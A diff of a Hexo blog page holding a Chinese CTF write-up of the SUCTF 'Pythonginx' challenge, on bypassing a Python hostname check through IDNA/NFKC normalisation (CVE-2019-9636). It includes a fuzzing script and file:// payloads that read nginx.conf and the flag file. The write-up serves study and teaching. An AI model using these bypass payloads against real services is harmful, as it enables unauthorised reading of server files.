@@ -5,25 +5,25 @@
   
 
   
-  <title>Pythonginx-1 | Hexo</title>
+  <title>pythonginx | Hexo</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
   <meta name="description" content="这道题主要涉及内容： CVE-2019-9636：urlsplit不处理NFKC标准化问题 idna编码转码问题 进入主题：·  上来就是源码，应该是要进行代码审计工作 进行代码分析： 123456789101112131415161718192021@app.route(&amp;#x27;&#x2F;getUrl&amp;#x27;, methods&#x3D;[&amp;#x27;GET&amp;#x27;, &amp;#x27;POST&amp;#x27;">
 <meta property="og:type" content="article">
-<meta property="og:title" content="Pythonginx-1">
-<meta property="og:url" content="http://example.com/2022/11/03/Pythonginx-1/index.html">
+<meta property="og:title" content="pythonginx">
+<meta property="og:url" content="http://example.com/2022/11/03/pythonginx/index.html">
 <meta property="og:site_name" content="Hexo">
 <meta property="og:description" content="这道题主要涉及内容： CVE-2019-9636：urlsplit不处理NFKC标准化问题 idna编码转码问题 进入主题：·  上来就是源码，应该是要进行代码审计工作 进行代码分析： 123456789101112131415161718192021@app.route(&amp;#x27;&#x2F;getUrl&amp;#x27;, methods&#x3D;[&amp;#x27;GET&amp;#x27;, &amp;#x27;POST&amp;#x27;">
 <meta property="og:locale" content="en_US">
 <meta property="og:image" content="http://example.com/.com//1.png">
-<meta property="og:image" content="http://example.com/.com//11/03/Pythonginx-1/2.png">
+<meta property="og:image" content="http://example.com/.com//2.png">
 <meta property="og:image" content="http://example.com/.com//3.png">
-<meta property="og:image" content="http://example.com/.com//11/03/Pythonginx-1/4.png">
-<meta property="og:image" content="http://example.com/.com//11/03/Pythonginx-1/6.png">
+<meta property="og:image" content="http://example.com/.com//4.png">
+<meta property="og:image" content="http://example.com/.com//6.png">
 <meta property="og:image" content="http://example.com/.com//5.png">
 <meta property="og:image" content="http://example.com/.com//7.png">
-<meta property="og:image" content="http://example.com/.com//11/03/Pythonginx-1/8.png">
-<meta property="article:published_time" content="2022-11-03T09:55:34.000Z">
-<meta property="article:modified_time" content="2022-11-03T15:03:46.588Z">
+<meta property="og:image" content="http://example.com/.com//8.png">
+<meta property="article:published_time" content="2022-11-03T15:17:56.000Z">
+<meta property="article:modified_time" content="2022-11-03T15:18:24.875Z">
 <meta property="article:author" content="John Doe">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="http://example.com/.com//1.png">
@@ -75,10 +75,10 @@
   </div>
 </header>
       <div class="outer">
-        <section id="main"><article id="post-Pythonginx-1" class="article article-type-post" itemscope itemprop="blogPost">
+        <section id="main"><article id="post-pythonginx" class="article article-type-post" itemscope itemprop="blogPost">
   <div class="article-meta">
-    <a href="/2022/11/03/Pythonginx-1/" class="article-date">
-  <time datetime="2022-11-03T09:55:34.000Z" itemprop="datePublished">2022-11-03</time>
+    <a href="/2022/11/03/pythonginx/" class="article-date">
+  <time datetime="2022-11-03T15:17:56.000Z" itemprop="datePublished">2022-11-03</time>
 </a>
     
   </div>
@@ -89,7 +89,7 @@
         
   
     <h1 class="article-title" itemprop="name">
-      Pythonginx-1
+      pythonginx
     </h1>
   
 
@@ -122,32 +122,32 @@
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> urlparse,urlunsplit,urlsplit</span><br><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> parse</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">do</span>():</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">65536</span>):</span><br><span class="line">        a=<span class="built_in">chr</span>(i)</span><br><span class="line">        url=<span class="string">&quot;http://suctf.c&quot;</span>+a</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">if</span> getUrl(url):</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;str:&quot;</span>+a+<span class="string">&quot; is answer!&quot;</span>)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getUrl</span>(<span class="params">url</span>):</span><br><span class="line">    url = url</span><br><span class="line">    host = parse.urlparse(url).hostname</span><br><span class="line">    <span class="keyword">if</span> host == <span class="string">&#x27;suctf.cc&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    parts = <span class="built_in">list</span>(urlsplit(url))</span><br><span class="line">    host = parts[<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">if</span> host == <span class="string">&#x27;suctf.cc&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    newhost = []</span><br><span class="line">    <span class="keyword">for</span> h <span class="keyword">in</span> host.split(<span class="string">&#x27;.&#x27;</span>):</span><br><span class="line">        newhost.append(h.encode(<span class="string">&#x27;idna&#x27;</span>).decode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">    parts[<span class="number">1</span>] = <span class="string">&#x27;.&#x27;</span>.join(newhost)</span><br><span class="line">    finalUrl = urlunsplit(parts).split(<span class="string">&#x27; &#x27;</span>)[<span class="number">0</span>]</span><br><span class="line">    host = parse.urlparse(finalUrl).hostname</span><br><span class="line">    <span class="keyword">if</span> host == <span class="string">&#x27;suctf.cc&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    do()</span><br></pre></td></tr></table></figure>
 
 <p>结果如下</p>
-<p><img src="/.com//11/03/Pythonginx-1/2.png" alt="2"></p>
+<p><img src="/.com//2.png" alt="2"></p>
 <p>那么我们可以构造payload：</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">getUrl?url=file:<span class="comment">//suctf.cℂ/usr/local/nginx/conf/nginx.conf</span></span><br></pre></td></tr></table></figure>
 
 <p>得到结果</p>
 <p><img src="/.com//3.png" alt="3"></p>
 <p>那么直接构造payload：<code>getUrl?url=file://suctf.cℂ/usr/fffffflag</code>就可以获取答案</p>
-<p><img src="/.com//11/03/Pythonginx-1/4.png" alt="4"></p>
+<p><img src="/.com//4.png" alt="4"></p>
 <h3 id="第二种：有关不处理NFKC标准化问题"><a href="#第二种：有关不处理NFKC标准化问题" class="headerlink" title="第二种：有关不处理NFKC标准化问题"></a>第二种：有关不处理NFKC标准化问题</h3><p>这个比较特殊，直接上例子：</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">b=<span class="string">&quot;file:////suctf.cc/usr/local/nginx/conf/nginx.conf&quot;</span></span><br><span class="line"><span class="built_in">print</span>(urlsplit(b))</span><br><span class="line"><span class="built_in">print</span>(urlparse(urlunsplit(urlsplit(b))))</span><br><span class="line"></span><br><span class="line">b=<span class="string">&quot;file:///suctf.cc/usr/local/nginx/conf/nginx.conf&quot;</span></span><br><span class="line"><span class="built_in">print</span>(urlsplit(b))</span><br><span class="line"><span class="built_in">print</span>(urlparse(urlunsplit(urlsplit(b))))</span><br><span class="line"></span><br><span class="line">b=<span class="string">&quot;http://1/suctf.cc/usr/local/nginx/conf/nginx.conf&quot;</span></span><br><span class="line"><span class="built_in">print</span>(urlsplit(b))</span><br><span class="line"><span class="built_in">print</span>(urlparse(urlunsplit(urlsplit(b))))</span><br></pre></td></tr></table></figure>
 
 <p>每种结果：</p>
-<p><img src="/.com//11/03/Pythonginx-1/6.png" alt="6"></p>
+<p><img src="/.com//6.png" alt="6"></p>
 <p><img src="/.com//5.png" alt="5"></p>
 <p><img src="/.com//7.png" alt="7"></p>
 <p>在python里urlsplit方法中，可以看到，在获取scheme的时候，协议的//是会被自动去掉的，而后续的netloc和path的判断分别是依据/为结尾来的，也就是说当我们每进行一次urlsplit，url就会失去两个/，而由于我们构造的url为<code>file:////</code>形式，所以我们host获取的netloc值第一次为空，第二次为<code>file:////</code>后面的正常内容，对判断进行了逃逸。</p>
 <p>其他操作相同，构造payload如下：<code>file:////suctf.cc/usr/local/nginx/conf/nginx.conf</code></p>
 <p>结果：</p>
-<p><img src="/.com//11/03/Pythonginx-1/8.png" alt="8"></p>
+<p><img src="/.com//8.png" alt="8"></p>
 <h3 id="相关文章："><a href="#相关文章：" class="headerlink" title="相关文章："></a>相关文章：</h3><p><strong><a target="_blank" rel="noopener" href="https://docs.python.org/3/library/urllib.parse.html">python中urlparse的方法</a></strong></p>
 <p><strong><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_47383889/article/details/121521553">urlparse和urlsplit的的区别</a></strong></p>
 
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2022/11/03/Pythonginx-1/" data-id="cla177nqb0000n8u4ayq34nzr" class="article-share-link">Share</a>
+      <a data-url="http://example.com/2022/11/03/pythonginx/" data-id="cla17qjsy0000xou41krtcaqi" class="article-share-link">Share</a>
       
       
     </footer>
@@ -156,19 +156,10 @@
     
 <nav id="article-nav">
   
-    <a href="/2022/11/03/pythonginx/" id="article-nav-newer" class="article-nav-link-wrap">
-      <strong class="article-nav-caption">Newer</strong>
-      <div class="article-nav-title">
-        
-          pythonginx
-        
-      </div>
-    </a>
   
-  
-    <a href="/2022/11/02/hello-world/" id="article-nav-older" class="article-nav-link-wrap">
+    <a href="/2022/11/03/Pythonginx-1/" id="article-nav-older" class="article-nav-link-wrap">
       <strong class="article-nav-caption">Older</strong>
-      <div class="article-nav-title">Hello World</div>
+      <div class="article-nav-title">Pythonginx-1</div>
     </a>
   
 </nav>
